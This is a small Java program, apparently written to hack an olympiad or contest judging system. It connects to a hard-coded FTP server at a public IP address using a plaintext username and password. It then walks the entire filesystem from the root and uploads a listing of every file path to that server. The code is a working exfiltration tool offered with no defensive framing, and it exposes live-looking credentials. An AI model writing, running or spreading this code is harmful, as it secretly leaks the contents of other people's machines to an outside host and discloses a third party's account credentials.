package Olimp.Hack;

import sun.net.www.protocol.ftp.FtpURLConnection;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;

public class Main {

    static String server = "ftp://mike:LMK_lmk230690@93.189.41.9/output.txt";
    static FtpURLConnection con;
    static OutputStream outputStream;
    public static void main(String[] args) throws FileNotFoundException, MalformedURLException {
        con = new FtpURLConnection(new URL(server));
        try {
            con.connect();
            OutputStream outputStream = con.getOutputStream();
            File dir = new File("/");
            try(PrintWriter out = new PrintWriter(outputStream)) {
                showData(dir, "", out);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void showData(File dir, String s, PrintWriter out) throws FileNotFoundException {
        System.out.println(s + dir);
        if(dir.isFile()){
            out.println(s + "file : " + dir);
            return;
        }
        if (dir.exists()) {
            File[] files = dir.listFiles();
            if(files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        out.println(s + "file : " + file);
                    } else if (file.exists()) showData(file, s + "--", out);
                    else return;
                }
            }
        }
    }
}
